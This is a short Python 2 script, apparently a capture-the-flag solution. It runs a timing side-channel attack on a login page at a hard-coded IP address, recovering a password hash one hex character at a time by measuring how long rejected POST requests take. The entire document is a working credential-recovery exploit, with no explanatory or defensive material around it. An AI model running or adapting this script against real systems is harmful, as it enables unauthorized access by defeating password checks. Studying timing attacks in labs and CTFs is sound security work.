import string
import requests
import time
import operator

URL = "http://54.175.3.248:8089/premium.php"

found_hash = "6"
while len(found_hash) != 33:
    
    longests = {c: 0.0 for c in 'abcdef0987654321'}

    for loop in range(5):
        for char in 'abcdef1234567890':
            data = {"username": "~~FLAG~~", 
                    "password": found_hash + char + 'a'*(31 - len(found_hash))}
    
            start = time.time()
    
            resp = requests.post(URL, data=data)
            data = resp.text
            if """<h1>Not Authorized</h1>""" in data:
                end = time.time()
                longests[char] += end - start
    
            else:
                print data

    
    sorted_x = sorted(longests.items(), key=operator.itemgetter(1))
    found_hash += sorted_x[-1][0]
    print found_hash, len(found_hash)
